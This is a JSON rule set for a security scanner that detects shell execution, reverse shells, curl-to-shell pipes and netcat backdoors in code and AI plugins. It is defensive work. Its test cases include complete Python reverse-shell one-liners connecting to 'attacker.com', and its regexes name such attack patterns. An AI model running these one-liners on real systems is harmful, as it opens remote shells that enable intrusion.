{
  "$schema": "../rule-schema.json",
  "category": "Shell Execution",
  "rules": [
    {
      "id": "SHELL-001",
      "title": "Child process spawn/exec",
      "description": "Spawning shell processes can execute arbitrary system commands.",
      "severity": "high",
      "contexts": ["code", "skill", "plugin"],
      "pattern": "\\b(child_process|require\\s*\\(\\s*['\"]child_process['\"]\\s*\\))\\s*\\.\\s*(exec|execSync|spawn|spawnSync|execFile|execFileSync|fork)\\s*\\(",
      "file_extensions": ["js", "ts", "mjs", "cjs"],
      "remediation": "Validate all inputs passed to shell commands. Prefer execFile over exec when possible."
    },
    {
      "id": "SHELL-002",
      "title": "Shell execution via execa/shelljs",
      "description": "Popular shell execution libraries that can run arbitrary commands.",
      "severity": "high",
      "contexts": ["code", "skill", "plugin"],
      "pattern": "\\b(execa|shelljs|\\$`|shell\\.exec)\\s*\\(",
      "file_extensions": ["js", "ts", "mjs", "cjs"],
      "remediation": "Audit all shell commands being executed and validate inputs."
    },
    {
      "id": "SHELL-003",
      "title": "Python subprocess with non-list arguments",
      "description": "subprocess call with string or variable arguments is vulnerable to command injection.",
      "severity": "medium",
      "contexts": ["code", "skill", "plugin"],
      "pattern": "\\bsubprocess\\s*\\.\\s*(run|call|Popen|check_output|check_call|getoutput|getstatusoutput)\\s*\\(\\s*[^\\[\\s]",
      "file_extensions": ["py"],
      "remediation": "Use shell=False and pass arguments as a list. Validate all inputs."
    },
    {
      "id": "SHELL-004",
      "title": "Python os.system/popen",
      "description": "os.system() and os.popen() execute shell commands.",
      "severity": "medium",
      "contexts": ["code", "skill", "plugin"],
      "pattern": "\\bos\\s*\\.\\s*(system|popen)\\s*\\(",
      "file_extensions": ["py"],
      "remediation": "Use subprocess module with shell=False instead."
    },
    {
      "id": "SHELL-005",
      "title": "Destructured child_process import",
      "description": "Importing exec/spawn from child_process enables shell command execution.",
      "severity": "high",
      "contexts": ["code", "skill", "plugin"],
      "pattern": "(const|let|var)\\s*\\{\\s*(exec|execSync|spawn|spawnSync|execFile|fork)[^}]*\\}\\s*=\\s*require\\s*\\(\\s*['\"]child_process['\"]\\s*\\)",
      "file_extensions": ["js", "ts", "mjs", "cjs"],
      "remediation": "Review shell command usage for security issues."
    },
    {
      "id": "SHELL-006",
      "title": "Direct exec/execSync call",
      "description": "Direct exec() or execSync() calls execute shell commands.",
      "severity": "high",
      "contexts": ["code", "skill", "plugin"],
      "pattern": "\\b(exec|execSync)\\s*\\(\\s*['\"`]",
      "file_extensions": ["js", "ts", "mjs", "cjs"],
      "remediation": "Validate all shell command inputs."
    },
    {
      "id": "SCRIPT-001",
      "title": "Reverse shell pattern",
      "description": "Bash reverse shell connects back to attacker-controlled server.",
      "severity": "critical",
      "contexts": ["code", "skill", "plugin"],
      "pattern": "(bash\\s+-i\\s+>&\\s*/dev/tcp/|nc\\s+(-e|--exec)\\s+/bin/(ba)?sh|/dev/tcp/[^/]+/[0-9]+)",
      "file_extensions": ["sh", "bash", "zsh"],
      "remediation": "Remove reverse shell code immediately."
    },
    {
      "id": "SCRIPT-002",
      "title": "Curl/wget pipe to shell",
      "description": "Downloading and executing remote scripts is extremely dangerous. Trusted installer domains are downgraded post-scan.",
      "severity": "critical",
      "contexts": ["code", "skill", "plugin"],
      "pattern": "(curl|wget)\\s+[^\\n|]*\\|\\s*(sudo\\s+)?(ba)?sh",
      "file_extensions": ["sh", "bash", "zsh"],
      "remediation": "Download scripts and review before executing."
    },
    {
      "id": "SCRIPT-003",
      "title": "Python reverse shell",
      "description": "Python one-liner reverse shell pattern combining socket with shell spawning (subprocess, os.dup2, pty.spawn).",
      "severity": "critical",
      "contexts": ["code", "skill", "plugin"],
      "pattern": "python[23]?\\s+-c\\s+.import\\s+socket.*?(?:subprocess\\.(?:call|Popen|run)|os\\.dup2|pty\\.spawn)",
      "file_extensions": ["sh", "bash", "zsh"],
      "remediation": "Remove reverse shell code.",
      "test_cases": {
        "should_match": [
          "python -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"attacker.com\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
          "python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"attacker.com\",4444));os.dup2(s.fileno(),0);pty.spawn(\"/bin/sh\")'",
          "python -c \"import socket,subprocess;s=socket.socket();s.connect(('host',1234));subprocess.Popen(['/bin/bash'],stdin=s.fileno())\""
        ],
        "should_not_match": [
          "python3 -c \"import socket; s=socket.socket(socket.AF_INET, socket.SOCK_DGRAM); s.connect(('8.8.8.8', 80)); print(s.getsockname()[0])\"",
          "python -c 'import socket;s=socket.socket();s.connect((\"example.com\",443));data=s.recv(1024);print(data)'",
          "python3 -c \"import socket; sock = socket.socket(); sock.bind(('localhost', 9000))\""
        ]
      }
    },
    {
      "id": "SHELL-007",
      "title": "Subprocess with shell=True",
      "description": "subprocess with shell=True passes commands through the shell, enabling command injection.",
      "severity": "high",
      "contexts": ["code", "skill", "plugin"],
      "pattern": "\\bsubprocess\\s*\\.\\s*(run|call|Popen|check_output|check_call)\\s*\\([^)]*shell\\s*=\\s*True",
      "file_extensions": ["py"],
      "remediation": "Use shell=False (the default) and pass arguments as a list."
    },
    {
      "id": "SHELL-008",
      "title": "Netcat with shell execution",
      "description": "Netcat (nc/ncat) combined with shell execution is a common backdoor pattern.",
      "severity": "critical",
      "contexts": ["code", "skill", "plugin"],
      "pattern": "\\b(nc|ncat|netcat)\\s+.*(-e|--exec|\\|\\s*/bin/(ba)?sh)",
      "file_extensions": ["sh", "bash", "zsh", "py", "rb", "pl", "js", "ts", "mjs", "cjs", "md", "txt", "yaml", "yml"],
      "remediation": "Remove netcat shell execution patterns."
    },
    {
      "id": "SHELL-009",
      "title": "Python pexpect shell spawning",
      "description": "pexpect.spawn() creates interactive shell processes. In plugins and MCP servers, this gives AI agents unrestricted shell access to execute arbitrary commands.",
      "severity": "high",
      "contexts": ["code", "skill", "plugin"],
      "pattern": "\\bpexpect\\s*\\.\\s*(spawn|spawnu|run)\\s*\\(",
      "file_extensions": ["py"],
      "remediation": "Restrict shell access. Use allowlists for permitted commands instead of spawning unrestricted shells.",
      "test_cases": {
        "should_match": [
          "shell = pexpect.spawn(cmd, env=overrideenv)",
          "child = pexpect.spawnu('/bin/bash')",
          "pexpect.run('ls -la')"
        ],
        "should_not_match": [
          "import pexpect",
          "except pexpect.TIMEOUT:",
          "pexpect.EOF"
        ]
      }
    },
    {
      "id": "SHELL-010",
      "title": "Python pty.spawn shell",
      "description": "pty.spawn() creates a pseudo-terminal and spawns a shell process. Commonly used in reverse shells and privilege escalation.",
      "severity": "high",
      "contexts": ["code", "skill", "plugin"],
      "pattern": "\\bpty\\s*\\.\\s*spawn\\s*\\(",
      "file_extensions": ["py"],
      "remediation": "Remove pty.spawn() usage. Use subprocess with restricted permissions instead.",
      "test_cases": {
        "should_match": [
          "pty.spawn('/bin/bash')",
          "pty.spawn(\"/bin/sh\")"
        ],
        "should_not_match": [
          "import pty",
          "pty.openpty()"
        ]
      }
    },
    {
      "id": "SHELL-011",
      "title": "Python os.exec* process replacement",
      "description": "os.exec*() functions replace the current process with a new program. Can be used to escape sandboxes or execute arbitrary binaries.",
      "severity": "medium",
      "contexts": ["code", "skill", "plugin"],
      "pattern": "\\bos\\s*\\.\\s*(execl|execle|execlp|execv|execve|execvp|execvpe)\\s*\\(",
      "file_extensions": ["py"],
      "remediation": "Use subprocess with restricted permissions instead of os.exec*().",
      "test_cases": {
        "should_match": [
          "os.execvp('bash', ['bash'])",
          "os.execl('/bin/sh', 'sh', '-c', cmd)",
          "os.execve('/usr/bin/env', args, env)"
        ],
        "should_not_match": [
          "os.path.exists()",
          "os.environ.get()"
        ]
      }
    },
    {
      "id": "SHELL-012",
      "title": "Python asyncio subprocess shell",
      "description": "asyncio.create_subprocess_shell() executes commands through the system shell. The _exec variant spawns processes directly.",
      "severity": "high",
      "contexts": ["code", "skill", "plugin"],
      "pattern": "\\basyncio\\s*\\.\\s*create_subprocess_(shell|exec)\\s*\\(",
      "file_extensions": ["py"],
      "remediation": "Validate and restrict commands passed to asyncio subprocess functions.",
      "test_cases": {
        "should_match": [
          "await asyncio.create_subprocess_shell(cmd)",
          "proc = asyncio.create_subprocess_exec('ls', '-la')"
        ],
        "should_not_match": [
          "asyncio.create_task()",
          "asyncio.subprocess.PIPE"
        ]
      }
    },
    {
      "id": "SHELL-013",
      "title": "Python subprocess.Popen persistent process",
      "description": "subprocess.Popen() creates a persistent subprocess. In MCP servers and plugins, this can provide AI agents with long-running shell access.",
      "severity": "medium",
      "contexts": ["code", "skill", "plugin"],
      "pattern": "\\bsubprocess\\s*\\.\\s*Popen\\s*\\(",
      "file_extensions": ["py"],
      "exclude_patterns": [
        "subprocess\\.Popen\\s*\\(\\s*\\[\\s*['\"](?:which|git|pip|npm|node|python|rg|grep|find|ls|cat|head|tail|wc|sort|uniq|diff|echo|true|false)['\"]"
      ],
      "remediation": "Use subprocess.run() for one-shot commands. If Popen is needed, restrict allowed commands and validate inputs.",
      "test_cases": {
        "should_match": [
          "proc = subprocess.Popen(cmd)",
          "subprocess.Popen(['/bin/bash'])",
          "subprocess.Popen(['bash', '-c', command])"
        ],
        "should_not_match": [
          "subprocess.run(['ls'])",
          "subprocess.check_output(['git', 'status'])"
        ]
      }
    }
  ]
}
